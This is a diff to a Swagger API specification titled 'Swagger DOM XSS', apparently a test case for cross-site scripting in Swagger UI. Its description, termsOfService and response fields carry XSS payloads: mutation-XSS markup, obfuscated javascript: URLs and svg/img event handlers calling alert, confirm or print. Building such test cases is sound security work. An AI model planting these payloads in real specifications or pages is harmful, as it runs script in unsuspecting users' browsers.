@@ -1,10 +1,9 @@
 swagger: '2.0'
 info: 
   title: Swagger DOM XSS
-  description: |
-    <math><mtext><option><textarea><svg/onload=alert(1)>
+  description: <math><mtext><option><textarea><svg/onload=alert(1)>
     
-  termsOfService: "Jav%09ascript:%00alert()"
+  termsOfService: "javascript:%00alert()"
   version: production
 basePath: /JSSResource/
 produces:
@@ -21,7 +20,7 @@ paths:
       responses:
         '200':
           type: string   
-          description: <h1>prints xss<img onerror=confirm() src=x><svg/onload></h1>
+          description: <h1>prints xss</h1><img onfocus=print() src=x></img><svg/onload=alert() /></div>
       tags:
         - accounts
       operationId: findAccounts
